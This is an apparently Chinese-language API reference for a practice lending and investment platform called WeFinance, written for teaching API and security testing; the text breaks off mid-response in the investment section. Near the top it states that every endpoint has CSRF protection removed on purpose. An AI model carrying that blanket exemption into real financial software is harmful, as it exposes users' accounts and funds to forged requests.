# WeFinance 完整API文档

## 文档说明

本文档包含WeFinance平台所有API接口的详细说明，专门用于API测试和安全测试教学。

**特点**：
- ✅ 所有接口已移除CSRF验证要求（使用 `@csrf_exempt` 装饰器）
- ✅ 统一返回JSON格式数据
- ✅ 已修复PhoneNumber等特殊字段序列化问题
- ✅ 支持JSON和Form两种请求格式
- ✅ 完整的错误处理和友好的错误提示
- ✅ 完全响应式布局，支持PC、平板、H5移动端访问

**基础URL**: `<你的项目地址>` (例如: `http://192.168.1.100:8000` 或 `http://127.0.0.1:8000`)

**API路径前缀**:
- 认证API: `/auth/api/`
- 借款API: `/borrow/api/`
- 投资API: `/investments/api/`
- 用户中心: `/user/`

**响应格式规范**:
```json
{
    "status": 0,          // 0=成功, 非0=失败
    "message": "提示信息",
    "data": {}            // 响应数据（可选）
}
```

---

## 目录

1. [认证相关API](#1-认证相关api)
2. [用户资料API](#2-用户资料api)
3. [银行卡管理API](#3-银行卡管理api)
4. [实名认证API](#4-实名认证api)
5. [借款产品API](#5-借款产品api)
6. [借款申请API](#6-借款申请api)
7. [借款审核管理API（管理员专用）](#7-借款审核管理api管理员专用)
8. [合同相关API](#8-合同相关api)
9. [还款相关API](#9-还款相关api)
10. [投资产品API](#10-投资产品api)
11. [投资操作API](#11-投资操作api)
12. [投资统计API](#12-投资统计api)
13. [账单管理API](#13-账单管理api)
14. [客服系统API](#14-客服系统api)
15. [客服WebSocket接口](#15-客服websocket接口)
16. [安全测试演示API](#16-安全测试演示api)

---

## 1. 认证相关API

### 1.1 用户登录

**接口地址**: `/auth/api/login/`  
**请求方法**: POST  
**Content-Type**: `application/json` 或 `application/x-www-form-urlencoded`  
**是否需要认证**: 否

**请求参数**:
| 参数名 | 类型 | 必填 | 说明 |
|--------|------|------|------|
| username | string | 是 | 用户名/手机号/邮箱 |
| password | string | 是 | 密码 |
| remember_me | boolean/string | 否 | 是否记住我（默认false）<br>支持布尔值true/false或字符串"true"/"false"/"1"/"0" |

**请求示例（JSON格式）**:
```json
// 使用布尔值（推荐）
{
    "username": "testuser",
    "password": "Test123456",
    "remember_me": true
}

// 或使用字符串（也支持）
{
    "username": "testuser",
    "password": "Test123456",
    "remember_me": "true"
}
```

**请求示例（Form格式）**:
```
username=testuser&password=Test123456&remember_me=true
```

**成功响应（200）**:
```json
{
    "status": 0,
    "message": "欢迎回来，testuser！",
    "data": {
        "user_id": 1,
        "username": "testuser",
        "email": "test@example.com",
        "phone": "+8613800138000",
        "is_verified": true
    }
}
```

**失败响应**:
```json
// 404 - 用户不存在
{
    "status": 404,
    "message": "用户不存在"
}

// 401 - 密码错误
{
    "status": 401,
    "message": "密码错误"
}

// 403 - 账户被禁用
{
    "status": 403,
    "message": "该账户已被禁用，请联系管理员"
}
```

---

### 1.2 用户注册

**接口地址**: `/auth/api/register/`  
**请求方法**: POST  
**Content-Type**: `application/json` 或 `application/x-www-form-urlencoded`  
**是否需要认证**: 否

**请求参数**:
| 参数名 | 类型 | 必填 | 说明 |
|--------|------|------|------|
| username | string | 是 | 用户名（3-20字符） |
| email | string | 是 | 邮箱 |
| phone | string | 是 | 手机号（11位数字） |
| password1 | string | 是 | 密码（8-20字符） |
| password2 | string | 是 | 确认密码 |

**请求示例**:
```json
{
    "username": "newuser",
    "email": "newuser@example.com",
    "phone": "13900139000",
    "password1": "NewPass123",
    "password2": "NewPass123"
}
```

**成功响应（201）**:
```json
{
    "status": 0,
    "message": "注册成功！欢迎加入WeFinance！",
    "data": {
        "user_id": 2,
        "username": "newuser",
        "email": "newuser@example.com",
        "phone": "+8613900139000"
    }
}
```

**失败响应（400）**:
```json
{
    "status": 400,
    "message": "参数验证失败",
    "errors": [
        "密码长度必须在8-20字符之间",
        "两次密码输入不一致"
    ]
}
```

---

### 1.3 用户登出

**接口地址**: `/auth/api/logout/`  
**请求方法**: POST  
**是否需要认证**: 否（但建议在已登录状态下调用）

**成功响应（200）**:
```json
{
    "status": 0,
    "message": "已安全退出"
}
```

---

### 1.4 获取当前用户信息

**接口地址**: `/auth/api/user/`  
**请求方法**: GET  
**是否需要认证**: 是

**成功响应（200）**:
```json
{
    "status": 0,
    "data": {
        "user_id": 1,
        "username": "testuser",
        "email": "test@example.com",
        "phone": "+8613800138000",
        "is_verified": true,
        "is_vip": false,
        "vip_level": 0,
        "balance": "10000.00",
        "total_investment": "50000.00",
        "total_earnings": "1200.50"
    }
}
```

**失败响应（401）**:
```json
{
    "status": 401,
    "message": "请先登录"
}
```

---

## 2. 用户资料API

### 2.1 获取用户资料

**接口地址**: `/auth/api/profile/`  
**请求方法**: GET  
**是否需要认证**: 是

**成功响应（200）**:
```json
{
    "status": 0,
    "data": {
        "user_id": 1,
        "username": "testuser",
        "email": "test@example.com",
        "phone": "+8613800138000",
        "real_name": "张三",
        "id_number": "110101199001011234",
        "is_verified": true,
        "verification_status": "approved",
        "gender": "male",
        "birthday": "1990-01-01",
        "education": "本科",
        "occupation": "软件工程师",
        "company": "某科技公司",
        "monthly_income": "15000.00",
        "address": "北京市朝阳区xxx"
    }
}
```

---

### 2.2 更新用户资料

**接口地址**: `/auth/api/profile/update/`  
**请求方法**: POST  
**Content-Type**: `application/json` 或 `application/x-www-form-urlencoded`  
**是否需要认证**: 是

**请求参数（所有参数均可选）**:
| 参数名 | 类型 | 说明 |
|--------|------|------|
| gender | string | 性别 (male/female) |
| birthday | string | 生日 (YYYY-MM-DD) |
| education | string | 学历 |
| occupation | string | 职业 |
| company | string | 公司 |
| monthly_income | decimal | 月收入 |
| address | string | 地址 |

**请求示例**:
```json
{
    "gender": "male",
    "birthday": "1990-01-01",
    "education": "本科",
    "occupation": "软件工程师",
    "company": "某科技公司",
    "monthly_income": "15000",
    "address": "北京市朝阳区xxx"
}
```

**成功响应（200）**:
```json
{
    "status": 0,
    "message": "资料更新成功"
}
```

---

## 3. 银行卡管理API

### 3.1 获取银行卡列表

**接口地址**: `/auth/api/bank-cards/`  
**请求方法**: GET  
**是否需要认证**: 是

**成功响应（200）**:
```json
{
    "status": 0,
    "data": {
        "count": 2,
        "cards": [
            {
                "id": 1,
                "bank_name": "中国工商银行",
                "card_number": "6222 **** **** 1234",
                "cardholder_name": "张三",
                "card_type": "debit",
                "is_default": true,
                "created_at": "2023-12-01T10:30:00Z"
            },
            {
                "id": 2,
                "bank_name": "中国建设银行",
                "card_number": "6227 **** **** 5678",
                "cardholder_name": "张三",
                "card_type": "debit",
                "is_default": false,
                "created_at": "2023-12-05T14:20:00Z"
            }
        ]
    }
}
```

---

### 3.2 添加银行卡

**接口地址**: `/auth/api/bank-cards/add/`  
**请求方法**: POST  
**Content-Type**: `application/json` 或 `application/x-www-form-urlencoded`  
**是否需要认证**: 是

**请求参数**:
| 参数名 | 类型 | 必填 | 说明 |
|--------|------|------|------|
| bank_name | string | 是 | 银行名称 |
| card_number | string | 是 | 卡号 |
| cardholder_name | string | 是 | 持卡人姓名 |
| card_type | string | 是 | 卡类型 (debit/credit) |
| is_default | boolean/string | 否 | 是否设为默认卡<br>支持布尔值true/false或字符串"true"/"false"/"1"/"0" |

**请求示例**:
```json
{
    "bank_name": "中国工商银行",
    "card_number": "6222021234567891234",
    "cardholder_name": "张三",
    "card_type": "debit",
    "is_default": true
}
```

**重要提示**: 
- 参数名为 `cardholder_name`（持卡人姓名），不是 `card_holder`
- `card_number` 会被自动去除空格，支持带空格输入

**成功响应（201）**:
```json
{
    "status": 0,
    "message": "银行卡添加成功",
    "data": {
        "card_id": 3
    }
}
```

---

### 3.3 修改银行卡信息

**接口地址**: `/auth/api/bank-cards/<card_id>/update/`  
**请求方法**: POST  
**Content-Type**: `application/json` 或 `application/x-www-form-urlencoded`  
**是否需要认证**: 是

**请求参数**:
| 参数名 | 类型 | 必填 | 说明 |
|--------|------|------|------|
| bank_name | string | 否 | 银行名称 |
| cardholder_name | string | 否 | 持卡人姓名 |
| card_type | string | 否 | 卡类型 (debit/credit) |

**重要提示**: 
- 至少需要修改一项信息
- 银行卡号不可修改，如需更换卡号请先删除后重新添加

**请求示例**:
```json
{
    "bank_name": "中国建设银行",
    "cardholder_name": "李四",
    "card_type": "credit"
}
```

**成功响应（200）**:
```json
{
    "status": 0,
    "message": "银行卡信息修改成功",
    "data": {
        "id": 1,
        "bank_name": "中国建设银行",
        "cardholder_name": "李四",
        "card_type": "credit"
    }
}
```

**失败响应**:
```json
// 400 - 参数错误
{
    "status": 400,
    "message": "请至少修改一项信息"
}

// 404 - 银行卡不存在
{
    "status": 404,
    "message": "银行卡不存在或已被删除"
}
```

---

### 3.4 删除银行卡

**接口地址**: `/auth/api/bank-cards/<card_id>/delete/`  
**请求方法**: POST  
**是否需要认证**: 是

**成功响应（200）**:
```json
{
    "status": 0,
    "message": "银行卡删除成功"
}
```

---

## 4. 实名认证API

### 4.1 提交实名认证

**接口地址**: `/auth/api/verification/submit/`  
**请求方法**: POST  
**Content-Type**: `multipart/form-data`  
**是否需要认证**: 是

**请求参数**:
| 参数名 | 类型 | 必填 | 说明 |
|--------|------|------|------|
| real_name | string | 是 | 真实姓名 |
| id_number | string | 是 | 身份证号（18位） |
| id_front_image | file | 是 | 身份证正面照片 |
| id_back_image | file | 是 | 身份证反面照片 |

**请求示例（使用Postman）**:
```
1. 选择Body -> form-data
2. 添加字段：
   - real_name: 张三
   - id_number: 110101199001011234
   - id_front_image: [选择文件]
   - id_back_image: [选择文件]
```

**成功响应（200）**:
```json
{
    "status": 0,
    "message": "实名认证资料提交成功，我们将在24小时内完成审核"
}
```

---

### 4.2 查询实名认证状态

**接口地址**: `/auth/api/verification/status/`  
**请求方法**: GET  
**是否需要认证**: 是

**成功响应（200）**:
```json
{
    "status": 0,
    "data": {
        "is_verified": true,
        "verification_status": "approved",
        "real_name": "张三",
        "id_number": "110101199001011234",
        "submitted_at": "2023-12-01T10:00:00Z",
        "verified_at": "2023-12-01T15:30:00Z",
        "review_notes": null
    }
}
```

**认证状态说明**:
- `none`: 未提交
- `pending`: 审核中
- `approved`: 已通过
- `rejected`: 已拒绝

---

### 4.3 获取用户头像

**接口地址**: `/auth/api/avatar/`  
**请求方法**: GET  
**是否需要认证**: 是

**成功响应（200）**:
```json
{
    "status": 0,
    "data": {
        "avatar_url": "/media/avatars/user_1_avatar.jpg",
        "has_avatar": true
    }
}
```

---

### 4.4 修改用户头像

**接口地址**: `/auth/api/avatar/update/`  
**请求方法**: POST  
**Content-Type**: `multipart/form-data`  
**是否需要认证**: 是

**请求参数**:
| 参数名 | 类型 | 必填 | 说明 |
|--------|------|------|------|
| avatar | file | 是 | 头像图片文件（支持JPG/PNG/GIF/WebP，最大2MB） |

**请求示例（使用Postman）**:
```
1. 选择Body -> form-data
2. 添加字段：
   - avatar: [选择图片文件]
```

**请求示例（使用curl）**:
```bash
curl -X POST http://192.168.233.129/auth/api/avatar/update/ \
  -b cookies.txt \
  -F "avatar=@/path/to/avatar.jpg"
```

**成功响应（200）**:
```json
{
    "status": 0,
    "message": "头像更新成功",
    "data": {
        "avatar_url": "/media/avatars/user_1_avatar.jpg"
    }
}
```

**失败响应**:
```json
// 400 - 未选择文件
{
    "status": 400,
    "message": "请选择要上传的头像图片"
}

// 400 - 格式错误
{
    "status": 400,
    "message": "只支持 JPG、PNG、GIF、WebP 格式的图片"
}

// 400 - 文件过大
{
    "status": 400,
    "message": "图片大小不能超过2MB"
}
```

---

## 5. 借款产品API

### 5.1 获取借款产品列表

**接口地址**: `/borrow/api/products/`  
**请求方法**: GET  
**是否需要认证**: 否

**查询参数（可选）**:
| 参数名 | 类型 | 说明 |
|--------|------|------|
| type | string | 产品类型 (credit/car/house) |
| min_amount | decimal | 最小金额 |
| max_rate | decimal | 最大利率 |

**请求示例**:
```
GET /borrow/api/products/?type=credit&min_amount=10000&max_rate=12
```

**成功响应（200）**:
```json
{
    "status": 0,
    "data": {
        "count": 3,
        "products": [
            {
                "id": 1,
                "name": "信用快贷",
                "product_type": "credit",
                "product_type_display": "信用贷款",
                "min_amount": "5000.00",
                "max_amount": "50000.00",
                "min_rate": "8.00",
                "max_rate": "12.00",
                "min_term": 3,
                "max_term": 36,
                "description": "无需抵押，快速审批",
                "features": "秒批，当日放款"
            }
        ]
    }
}
```

---

### 5.2 获取借款产品详情

**接口地址**: `/borrow/api/products/<product_id>/`  
**请求方法**: GET  
**是否需要认证**: 否

**成功响应（200）**:
```json
{
    "status": 0,
    "data": {
        "id": 1,
        "name": "信用快贷",
        "product_type": "credit",
        "product_type_display": "信用贷款",
        "min_amount": "5000.00",
        "max_amount": "50000.00",
        "min_rate": "8.00",
        "max_rate": "12.00",
        "min_term": 3,
        "max_term": 36,
        "description": "无需抵押，快速审批",
        "features": "秒批，当日放款",
        "requirements": "实名认证，信用良好"
    }
}
```

---

## 6. 借款申请API

### 6.1 提交借款申请

**接口地址**: `/borrow/api/apply/`  
**请求方法**: POST  
**Content-Type**: `application/json` 或 `application/x-www-form-urlencoded`  
**是否需要认证**: 是（需要先完成实名认证）

**请求参数**:
| 参数名 | 类型 | 必填 | 说明 |
|--------|------|------|------|
| product_id | integer | 是 | 产品ID |
| amount | decimal | 是 | 借款金额 |
| term | integer | 是 | 借款期限（月） |
| purpose | string | 是 | 借款用途 |
| purpose_detail | string | 否 | 用途详细说明 |
| profession | string | 否 | 职业类型 |
| monthly_income | decimal | 否 | 月收入 |
| monthly_debt | decimal | 否 | 月负债 |
| company_name | string | 否 | 工作单位 |
| work_years | integer | 否 | 工作年限 |
| contact_name | string | 否 | 紧急联系人姓名 |
| contact_phone | string | 否 | 紧急联系人电话 |
| contact_relation | string | 否 | 与紧急联系人的关系 |

**字段说明**:
- `purpose`: 借款用途类型（如：个人消费、装修、旅游等）
- `purpose_detail`: 借款用途的详细描述
- `profession`: 职业类型（如：企业职工、个体经营、公务员等）
- `monthly_income`: 月收入金额，建议不少于2000元
- `monthly_debt`: 每月负债金额，负债收入比建议不超过80%
- `company_name`: 工作单位名称，至少2个字符
- `work_years`: 工作年限，范围0-50年
- `contact_name`: 紧急联系人姓名，至少2个字符
- `contact_phone`: 紧急联系人手机号，必须是11位数字
- `contact_relation`: 与紧急联系人的关系（如：父母、配偶、朋友等）

**请求示例**:
```json
{
    "product_id": 1,
    "amount": 30000,
    "term": 12,
    "purpose": "个人消费",
    "purpose_detail": "购买家用电器和家具",
    "profession": "企业职工",
    "monthly_income": 15000,
    "monthly_debt": 3000,
    "company_name": "某某科技有限公司",
    "work_years": 5,
    "contact_name": "张三",
    "contact_phone": "13800138000",
    "contact_relation": "父母"
}
```

**成功响应（201）**:
```json
{
    "status": 0,
    "message": "借款申请提交成功！申请编号：JK20231201ABCD1234",
    "data": {
        "application_id": 1,
        "application_no": "JK20231201ABCD1234"
    }
}
```

**失败响应**:
```json
// 403 - 未实名认证
{
    "status": 403,
    "message": "请先完成实名认证后再申请借款"
}

// 400 - 金额超限
{
    "status": 400,
    "message": "借款金额必须在5000-50000之间"
}
```

---

### 6.2 获取我的借款申请列表

**接口地址**: `/borrow/api/applications/`  
**请求方法**: GET  
**是否需要认证**: 是

**查询参数（可选）**:
| 参数名 | 类型 | 说明 |
|--------|------|------|
| status | string | 申请状态 |
| page | integer | 页码（默认1） |
| page_size | integer | 每页数量（默认10） |

**申请状态说明**:
- `submitted`: 已提交
- `reviewing`: 审核中
- `approved`: 已批准
- `rejected`: 已拒绝
- `funded`: 已放款
- `repaying`: 还款中
- `completed`: 已完成

**成功响应（200）**:
```json
{
    "status": 0,
    "data": {
        "total": 5,
        "page": 1,
        "page_size": 10,
        "applications": [
            {
                "id": 1,
                "application_no": "JK20231201ABCD1234",
                "product_name": "信用快贷",
                "product_type": "credit",
                "amount": "30000.00",
                "term": 12,
                "status": "approved",
                "status_display": "已批准",
                "submitted_at": "2023-12-01T10:00:00Z",
                "reviewed_at": "2023-12-01T15:00:00Z",
                "purpose": "个人消费"
            }
        ]
    }
}
```

---

### 6.3 获取借款申请详情

**接口地址**: `/borrow/api/applications/<application_id>/`  
**请求方法**: GET  
**是否需要认证**: 是

**成功响应（200）**:
```json
{
    "status": 0,
    "data": {
        "id": 1,
        "application_no": "JK20231201ABCD1234",
        "product_name": "信用快贷",
        "product_type": "credit",
        "amount": "30000.00",
        "term": 12,
        "purpose": "个人消费",
        "status": "repaying",
        "status_display": "还款中",
        "submitted_at": "2023-12-01T10:00:00Z",
        "reviewed_at": "2023-12-01T15:00:00Z",
        "approved_at": "2023-12-01T16:00:00Z",
        "rejected_reason": null,
        "repayment_plans": [
            {
                "period": 1,
                "due_date": "2024-01-01",
                "principal": "2500.00",
                "interest": "300.00",
                "total_amount": "2800.00",
                "status": "paid",
                "paid_amount": "2800.00",
                "paid_at": "2023-12-28T10:00:00Z"
            },
            {
                "period": 2,
                "due_date": "2024-02-01",
                "principal": "2500.00",
                "interest": "300.00",
                "total_amount": "2800.00",
                "status": "pending",
                "paid_amount": "0.00",
                "paid_at": null
            }
        ],
        "documents": [
            {
                "id": 1,
                "document_type": "id_card",
                "sub_type": "front",
                "file_name": "id_front.jpg",
                "status": "approved",
                "uploaded_at": "2023-12-01T11:00:00Z",
                "review_notes": null
            }
        ],
        "credit_score": 680,
        "risk_level": "low"
    }
}
```

---

### 6.4 上传借款材料

**接口地址**: `/borrow/api/documents/upload/`  
**请求方法**: POST  
**Content-Type**: `multipart/form-data`  
**是否需要认证**: 是

**重要说明**:
- 借款申请提交后，状态为 `submitted`（已提交），此时**不会进入风控审批**
- 必须上传所有必需材料后，状态才会自动更新为 `reviewing`（审核中），并触发风控评估
- 必需材料包括：`bank_statement`（银行流水）、`income_proof`（收入证明）
- 如果用户未实名认证，还需上传 `id_card`（身份证）
- 所有必需材料上传完成后，系统会自动将申请状态从 `submitted` 更新为 `reviewing`

**请求参数**:
| 参数名 | 类型 | 必填 | 说明 |
|--------|------|------|------|
| application_id | integer | 是 | 申请ID |
| document_type | string | 是 | 文档类型 |
| file | file | 是 | 文件 |
| sub_type | string | 否 | 子类型（默认main） |

**文档类型说明**:
- `id_card`: 身份证（必需，如未实名认证）
- `income_proof`: 收入证明（必需）
- `bank_statement`: 银行流水（必需）
- `work_cert`: 工作证明（可选）
- `house_cert`: 房产证明（可选）
- `car_cert`: 车辆证明（可选）

**成功响应（200）**:
```json
// 普通上传成功
{
    "status": 0,
    "message": "文档上传成功",
    "data": {
        "document_id": 1,
        "file_name": "income_proof.pdf"
    }
}

// 所有必需材料已上传，状态已更新
{
    "status": 0,
    "message": "文档上传成功",
    "data": {
        "document_id": 2,
        "file_name": "bank_statement.pdf",
        "status_updated": true,
        "new_status": "reviewing",
        "message_extra": "所有必需材料已上传，申请已进入审核阶段"
    }
}
```

---

## 7. 借款审核管理API（管理员专用）

### 7.1 批准借款申请

**接口地址**: `/borrow/api/applications/<application_id>/approve/`  
**请求方法**: POST  
**Content-Type**: `application/x-www-form-urlencoded`  
**是否需要认证**: 是（需要管理员权限）

**请求参数**:
| 参数名 | 类型 | 必填 | 说明 |
|--------|------|------|------|
| approved_amount | decimal | 是 | 批准金额 |
| approved_rate | decimal | 是 | 批准年化利率（%） |
| approved_term | integer | 是 | 批准期限（月） |
| review_notes | string | 否 | 审核备注 |

**请求示例**:
```
approved_amount=50000
approved_rate=12.5
approved_term=12
review_notes=申请人信用良好，批准通过
```

**成功响应（200）**:
```json
{
    "success": true,
    "message": "审批成功",
    "redirect_url": "/admin-panel/loan-applications/"
}
```

**失败响应**:
```json
// 400 - 参数错误
{
    "success": false,
    "message": "参数格式错误"
}

// 400 - 参数值错误
{
    "success": false,
    "message": "参数值必须大于0"
}
```

**审批后操作**:
- 申请状态更新为 `approved`（已通过）
- 所有文档状态自动更新为 `approved`
- 自动创建风控评估记录（如果之前没有）
- 发送系统消息通知用户

---

### 7.2 拒绝借款申请

**接口地址**: `/borrow/api/applications/<application_id>/reject/`  
**请求方法**: POST  
**Content-Type**: `application/x-www-form-urlencoded`  
**是否需要认证**: 是（需要管理员权限）

**请求参数**:
| 参数名 | 类型 | 必填 | 说明 |
|--------|------|------|------|
| reject_reason | string | 是 | 拒绝原因 |

**请求示例**:
```
reject_reason=申请人信用记录不佳，负债比过高
```

**成功响应（200）**:
```json
{
    "success": true,
    "message": "操作成功",
    "redirect_url": "/admin-panel/loan-applications/"
}
```

**失败响应**:
```json
// 400 - 缺少拒绝原因
{
    "success": false,
    "message": "请填写拒绝原因"
}
```

**拒绝后操作**:
- 申请状态更新为 `rejected`（已拒绝）
- 所有文档状态自动更新为 `rejected`
- 发送系统消息通知用户

---

### 7.3 查看申请审核详情

**接口地址**: `/admin-panel/loan-applications/<application_id>/review/`  
**请求方法**: GET  
**是否需要认证**: 是（需要管理员权限）

**响应内容**: 
返回HTML页面，包含以下信息：
- 申请人基本信息
- 借款申请详情
- 上传的所有材料（按类型分组）
- 风控评估结果
- 用户其他申请历史
- 推荐批准利率

**说明**: 
此接口返回HTML页面而非JSON数据，主要用于管理后台Web界面展示。

---

## 8. 合同相关API

### 8.1 生成借款合同

**接口地址**: `/borrow/api/applications/<application_id>/generate-contract/`  
**请求方法**: POST  
**Content-Type**: `application/json` 或 `application/x-www-form-urlencoded`  
**是否需要认证**: 是

**说明**: 
审核通过（status=approved）的申请可以生成合同

**请求示例**:
```bash
curl -X POST http://your-domain/borrow/api/applications/64/generate-contract/ \
  -H "Cookie: sessionid=your_session_id"
```

**成功响应（200）**:
```json
{
    "status": 0,
    "message": "合同生成成功",
    "data": {
        "contract_id": 12,
        "contract_no": "CT20231201ABCD1234",
        "contract_status": "pending_sign",
        "status_display": "待签约",
        "generated_at": "2023-12-01T10:00:00Z",
        "contract_content": "<合同HTML内容>"
    }
}
```

**失败响应**:
```json
// 400 - 申请状态不符合
{
    "status": 400,
    "message": "申请尚未通过审核"
}

// 401 - 未登录
{
    "status": 401,
    "message": "请先登录"
}
```

---

### 8.2 签署借款合同

**接口地址**: `/borrow/api/applications/<application_id>/sign-contract/`  
**请求方法**: POST  
**Content-Type**: `application/json` 或 `application/x-www-form-urlencoded`  
**是否需要认证**: 是

**请求参数**:
| 参数名 | 类型 | 必填 | 说明 |
|--------|------|------|------|
| signature_data | string | 否 | 签名数据（不传则自动使用快速签约） |
| quick_sign | boolean | 否 | 是否快速签约（true/false，默认自动判断） |

**请求示例**:
```json
{
    "quick_sign": true
}
```

或携带签名数据：
```json
{
    "signature_data": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA..."
}
```

**成功响应（200）**:
```json
{
    "status": 0,
    "message": "快速签约成功，正在进行放款处理",
    "data": {
        "contract_id": 12,
        "contract_no": "CT20231201ABCD1234",
        "disbursement_no": "DIS20231201XYZ789",
        "is_quick_sign": true,
        "signed_at": "2023-12-01T11:00:00Z"
    }
}
```

**失败响应**:
```json
// 400 - 申请状态不符合
{
    "status": 400,
    "message": "申请状态不符合签约条件"
}

// 404 - 合同不存在
{
    "status": 404,
    "message": "合同不存在，请先生成合同"
}

// 400 - 合同状态不符合
{
    "status": 400,
    "message": "合同状态不符合签约条件，当前状态：已签约"
}
```

**签约后自动操作**:
- 合同状态更新为 `signed`（已签约）
- 申请状态更新为 `funded`（已放款）
- 自动创建放款记录
- 自动执行放款到用户余额

---

### 8.3 查看合同详情

**接口地址**: `/borrow/api/applications/<application_id>/contract/`  
**请求方法**: GET  
**是否需要认证**: 是

**成功响应（200）**:
```json
{
    "status": 0,
    "message": "获取成功",
    "data": {
        "has_contract": true,
        "contract_id": 12,
        "contract_no": "CT20231201ABCD1234",
        "contract_status": "signed",
        "status_display": "已签约",
        "contract_content": "<合同HTML内容>",
        "generated_at": "2023-12-01T10:00:00Z",
        "borrower_signed_at": "2023-12-01T11:00:00Z",
        "lender_signed_at": "2023-12-01T11:00:00Z"
    }
}
```

**失败响应**:
```json
// 404 - 合同不存在
{
    "status": 404,
    "message": "合同不存在",
    "data": {
        "has_contract": false,
        "application_status": "approved"
    }
}
```

---

### 8.4 查询放款状态

**接口地址**: `/borrow/api/applications/<application_id>/disbursement/`  
**请求方法**: GET  
**是否需要认证**: 是

**成功响应（200）**:
```json
{
    "status": 0,
    "message": "获取成功",
    "data": {
        "has_disbursement": true,
        "disbursement_id": 5,
        "disbursement_no": "DIS20231201XYZ789",
        "disbursement_status": "completed",
        "status_display": "已完成",
        "amount": "50000.00",
        "disbursement_method": "account_balance",
        "method_display": "账户余额",
        "created_at": "2023-12-01T11:00:00Z",
        "processed_at": "2023-12-01T11:00:30Z",
        "completed_at": "2023-12-01T11:01:00Z",
        "processing_notes": "放款成功"
    }
}
```

**失败响应**:
```json
// 404 - 放款记录不存在
{
    "status": 404,
    "message": "放款记录不存在",
    "data": {
        "has_disbursement": false,
        "application_status": "approved"
    }
}
```

**放款状态说明**:
- `pending`: 待处理
- `processing`: 处理中
- `completed`: 已完成
- `failed`: 失败

---

## 9. 还款相关API

### 9.1 信用评分查询

**接口地址**: `/borrow/api/credit-score/`  
**请求方法**: GET  
**是否需要认证**: 是

**成功响应（200）**:
```json
{
    "status": 0,
    "data": {
        "score": 680,
        "credit_history_score": 150,
        "asset_score": 120,
        "platform_behavior_score": 200,
        "basic_info_score": 210,
        "risk_level": "low",
        "updated_at": "2023-12-01T10:00:00Z"
    }
}
```

---

### 9.2 借款额度查询

**接口地址**: `/borrow/api/quota/`  
**请求方法**: GET  
**是否需要认证**: 是

**成功响应（200）**:
```json
{
    "status": 0,
    "data": {
        "credit_quota": "50000.00",
        "car_quota": "200000.00",
        "house_quota": "500000.00",
        "used_quota": "30000.00",
        "available_quota": "720000.00",
        "total_quota": "750000.00"
    }
}
```

---

### 9.3 还款

**接口地址**: `/borrow/api/repayment/`  
**请求方法**: POST  
**Content-Type**: `application/json` 或 `application/x-www-form-urlencoded`  
**是否需要认证**: 是

**请求参数**:
| 参数名 | 类型 | 必填 | 说明 |
|--------|------|------|------|
| plan_id | integer | 是 | 还款计划ID |
| amount | decimal | 是 | 还款金额 |
| payment_method | string | 否 | 支付方式（balance/bank_card，默认balance） |
| coupon_id | integer | 否 | 优惠券ID |

**请求示例**:
```json
{
    "plan_id": 1,
    "amount": 2800,
    "payment_method": "balance"
}
```

**成功响应（200）**:
```json
{
    "status": 0,
    "message": "还款成功",
    "data": {
        "plan_id": 1,
        "paid_amount": "2800.00",
        "remaining_periods": 11
    }
}
```

---

## 10. 投资产品API

### 10.1 获取可投资产品列表

**接口地址**: `/investments/api/products/`  
**请求方法**: GET  
**是否需要认证**: 否

**查询参数（可选）**:
| 参数名 | 类型 | 说明 |
|--------|------|------|
| min_rate | decimal | 最小年化利率 |
| max_rate | decimal | 最大年化利率 |
| min_term | integer | 最小期限（月） |
| max_term | integer | 最大期限（月） |

**成功响应（200）**:
```json
{
    "status": 0,
    "data": {
        "count": 5,
        "products": [
            {
                "id": 1,
                "name": "稳健理财A",
                "loan_amount": "100000.00",
                "raised_amount": "75000.00",
                "remaining_amount": "25000.00",
                "annual_rate": "8.50",
                "duration_months": 12,
                "status": "RECRUITING",
                "investor_count": 15,
                "progress_percentage": 75.0,
                "value_date": "2024-01-01",
                "maturity_date": "2025-01-01"
            }
        ]
    }
}
```

---

### 9.2 获取投资产品详情

**接口地址**: `/investments/api/products/<product_id>/`  
**请求方法**: GET  
**是否需要认证**: 否

**成功响应（200）**:
```json
{
    "status": 0,
    "data": {
        "id": 1,
        "name": "稳健理财A",
        "description": "低风险，稳定收益",
        "loan_amount": "100000.00",
        "raised_amount": "75000.00",
        "remaining_amount": "25000.00",
        "annual_rate": "8.50",
        "duration_months": 12,
        "status": "RECRUITING",
        "investor_count": 15,
        "progress_percentage": 75.0,
        "value_date": "2024-01-01",
        "maturity_date": "2025-01-01",
        "risk_level": "low",
        "repayment_method": "monthly"
    }
}
```

---

## 11. 投资操作API

### 11.1 投资

**接口地址**: `/investments/api/invest/`  
**请求方法**: POST  
**Content-Type**: `application/json` 或 `application/x-www-form-urlencoded`  
**是否需要认证**: 是（需要先完成实名认证）

**请求参数**:
| 参数名 | 类型 | 必填 | 说明 |
|--------|------|------|------|
| product_id | integer | 是 | 产品ID |
| amount | decimal | 是 | 投资金额（必须是100的倍数） |

**请求示例**:
```json
{
    "product_id": 1,
    "amount": 10000
}
```

**成功响应（200）**:
```json
{
    "status": 0,
    "message": "投资成功",
    "data": {
        "investment_id": 1,
        "expected_return": "850.00"
    }
}
```

**失败响应**:
```json
// 400 - 金额不符合要求
{
    "status": 400,
    "message": "投资金额必须是100的倍数"
}

// 400 - 余额不足
{
    "status": 400,
    "message": "账户余额不足"
}

// 403 - 未实名认证
{
    "status": 403,
    "message": "请先完成实名认证"
}
```

---

### 11.2 获取我的投资列表

**接口地址**: `/investments/api/my/`  
**请求方法**: GET  
**是否需要认证**: 是

**查询参数（可选）**:
| 参数名 | 类型 | 说明 |
|--------|------|------|
| status | string | 投资状态 |
| page | integer | 页码（默认1） |
| page_size | integer | 每页数量（默认10） |

**投资状态说明**:
- `confirmed`: 已确认
- `earning`: 收益中
- `completed`: 已完成
- `cancelled`: 已取消

**成功响应（200）**:
```json
{
    "status": 0,
    "data": {
        "total": 10,
        "page": 1,
        "page_size": 10,
        "investments": [
            {
                "id": 1,
                "product_name": "稳健理财A",
                "product_id": 1,
                "amount": "10000.00",
                "expected_return": "850.00",
                "actual_return": null,
                "status": "earning",
                "invest_time": "2023-12-01T10:00:00Z",
                "confirm_time": "2023-12-01T10:05:00Z",
                "value_date": "2024-01-01",
                "maturity_date": "2025-01-01",
                "annual_rate": "8.50"
            }
        ]
    }
}
```

---

### 11.3 获取投资详情

**接口地址**: `/investments/api/<investment_id>/`  
**请求方法**: GET  
**是否需要认证**: 是

**成功响应（200）**:
```json
{
    "status": 0,
    "data": {
        "id": 1,
        "product_name": "稳健理财A",
        "product_id": 1,
